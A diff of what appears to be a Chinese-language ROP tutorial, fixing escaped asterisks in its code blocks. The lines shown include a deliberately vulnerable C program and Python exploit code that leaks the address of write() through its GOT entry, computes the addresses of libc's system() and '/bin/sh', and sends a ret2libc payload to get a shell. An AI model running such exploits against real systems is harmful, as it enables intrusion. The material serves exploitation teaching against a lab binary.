@@ -21,7 +21,7 @@ ps:对于该篇文章使用的技术，最重要的一点基础是，清楚函�
         read(STDIN_FILENO, msg, 256);
     }
 
-    int main(int argc, char \*argv[]) {
+    int main(int argc, char *argv[]) {
         vul_func();
         write(STDOUT_FILENO,"ROP test\n", 9); 
         return 0;
@@ -167,10 +167,10 @@ write_plt_got_addr = elf.got['write']
 print "wirte plt got addr " + hex(write_plt_got_addr)
 vul_func = 0x0804841b
 
-payload = "A"\*payload_len + p32(write_plt_addr) + p32(vul_func) + p32(1) + p32(write_plt_got_addr) + p32(4)
+payload = "A"*payload_len + p32(write_plt_addr) + p32(vul_func) + p32(1) + p32(write_plt_got_addr) + p32(4)
 print payload
 
-print "[\*] begin to leak write_addr function address...\n"
+print "[*] begin to leak write_addr function address...\n"
 p.send(payload)
 
 write_addr = u32(p.recv(4))
@@ -239,9 +239,9 @@ write_plt_got_addr = elf.got['write']
 print "wirte plt got addr " + hex(write_plt_got_addr)
 vul_func = 0x0804841b
 
-payload = "A"\*payload_len + p32(write_plt_addr) + p32(vul_func) + p32(1) + p32(write_plt_got_addr) + p32(4)
+payload = "A"*payload_len + p32(write_plt_addr) + p32(vul_func) + p32(1) + p32(write_plt_got_addr) + p32(4)
 
-print "[\*] begin to leak write_addr function address...\n"
+print "[*] begin to leak write_addr function address...\n"
 p.send(payload)
 
 write_addr = u32(p.recv(4))
@@ -252,7 +252,7 @@ print "[+] the system_addr function address is " + hex(system_addr)
 binsh_addr = write_addr - (libc.symbols['write'] - next(libc.search('/bin/sh')))
 print "[+] the /bin/sh str address is " + hex(binsh_addr)
 
-print "[\*] begin to get shell...\n"
+print "[*] begin to get shell...\n"
 payload2 = "A"\*payload_len + p32(system_addr) + p32(vul_func) + p32(binsh_addr)
 
 p.send(payload2)
